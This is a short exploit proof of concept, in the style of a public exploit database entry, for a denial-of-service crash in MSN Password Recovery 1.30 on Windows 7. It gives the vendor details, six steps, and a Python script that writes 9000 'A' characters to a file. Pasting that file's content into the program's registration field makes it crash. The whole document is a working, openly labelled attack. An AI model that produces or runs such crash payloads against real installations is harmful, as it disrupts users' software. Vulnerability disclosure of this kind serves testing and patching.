# Exploit Title: MSN Password Recovery 1.30 - Denial of Service (PoC)
# Date: 2020-01-02
# Vendor Homepage: https://www.top-password.com/
# Software Link: https://www.top-password.com/download/MSNPRSetup.exe
# Exploit Author: Gokkulraj
# Tested Version: v1.30
# Tested on: Windows 7 x64

# 1.- Download and install MSN Password Recovery
# 2.- Run python code : MSN Password Recovery.py
# 3.- Open CRASH.txt and copy content to clipboard
# 4.- Open MSN Password Recovery and Click 'EnterKey'
# 5.- Paste the content of CRASH.txt into the Field: 'User Name and
Registration Code'
# 6.- click 'OK' you will see a crash.

#!/usr/bin/env python
Dos= "\x41" * 9000
myfile=open('CRASH.txt','w')
myfile.writelines(Dos)
myfile.close()
print("File created")